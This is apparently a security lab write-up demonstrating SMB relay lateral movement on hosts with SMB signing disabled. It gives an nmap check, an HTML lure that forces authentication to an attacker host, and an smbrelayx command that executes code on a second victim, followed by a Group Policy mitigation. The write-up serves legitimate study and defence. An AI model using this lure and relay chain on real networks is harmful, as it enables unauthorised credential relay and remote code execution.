# Lateral Movement via SMB Relaying

This lab looks at a lateral movement technique abusing SMB protocol if SMB signing is disabled. 

SMB signing is a security mechanism that allows digitally signing SMB packets that enforce their integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with in transit. 

If SMB signing is disabled, packets can be intercepted/modified and/or relayed to another system, which is what this lab is about.

## Environment

* 10.0.0.5 - attacker running Kali linux and smb relaying tool
* 10.0.0.2 - victim1; their credentials will be relayed to victim2
* 10.0.0.6 - victim2; code runs on victim2 with victim1 credentials

`10.0.0.2` -authenticates to-&gt; `10.0.0.5` -relays to-&gt; 10.0.0.6 -executes code with victim1 credentials

## Execution

One of the ways to check if SMB signing is `disabled` on an endpoint:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
nmap -p 445 10.0.0.6 -sS --script smb-security-mode.nse
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-12-31-10-45-27.png)

Let's create a simple HTML file that once opened will force the victim1 to authenticate to attacker's machine:

{% code-tabs %}
{% code-tabs-item title="message.html" %}
```markup
<html>
    <h1>holla good sir</h1>
    <img src="file://10.0.0.5/download.jpg">
</html>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

at the same time, let's fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to victim2@10.0.0.6 and will attempt to execute a command `ipconfig`on the end host:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```text
smbrelayx.py -h 10.0.0.6 -c "ipconfig"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Below is an gif showing the technique in action - on the left - victim 1 opening the malicious html we crafted earlier that forces it to attempt to authenticate to the attacker system \(on the right\). Once the authentication attempt comes in, it gets relayed to victim2@10.0.0.6 and ipconfig gets executed:

![](../.gitbook/assets/peek-2018-12-30-22-31.gif)

A stop frame from the above gif that highlights that the code execution indeed happend on 10.0.0.6:

![](../.gitbook/assets/screenshot-from-2018-12-30-22-33-59.png)

## Mitigation

In order to mitigate this type of attack, the best way to do it is use GPOs if possible and set the policy **Microsoft network client: Digitally sign communications \(always\)** to `Enabled`:

![](../.gitbook/assets/screenshot-from-2018-12-31-10-36-45.png)

With the above change, trying to execute the same attack, we get `Signature is REQUIRED`:

![](../.gitbook/assets/screenshot-from-2018-12-30-22-36-01.png)

The same nmap scan we did earlier now shows that the message signing is required:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
nmap -p 445 10.0.0.6 -sS --script smb-security-mode
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-12-31-11-05-59.png)

## References

{% embed url="https://ramnathshenoy.wordpress.com/2017/03/19/lateral-movement-with-smbrelayx-py/" %}

{% embed url="https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc785861\(v=ws.10\)" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc728025\(v=ws.10\)" %}

{% embed url="https://nmap.org/nsedoc/scripts/smb-security-mode.html" %}



